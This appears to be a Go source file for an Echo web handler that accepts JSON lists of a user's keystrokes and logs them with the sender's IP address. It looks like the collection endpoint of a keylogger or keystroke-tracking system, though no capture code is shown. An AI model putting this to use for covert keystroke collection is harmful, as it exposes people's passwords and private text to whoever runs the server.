package handlers

import (
	"fmt"
	"net/http"

	"github.com/labstack/echo/v4"
)

type KeystrokeReq struct {
	User string   `json:"user"`
	Keys []string `json:"keys"`
}

func HandleKeystrokes(c echo.Context) error {
	var req KeystrokeReq
	if err := c.Bind(&req); err != nil {
		return c.String(http.StatusBadRequest, "Invalid JSON")
	}

	fmt.Printf("[KEYS] %s (%s): %v\n", req.User, c.RealIP(), req.Keys)

	return c.JSON(http.StatusOK, map[string]string{"status": "ok"})
}
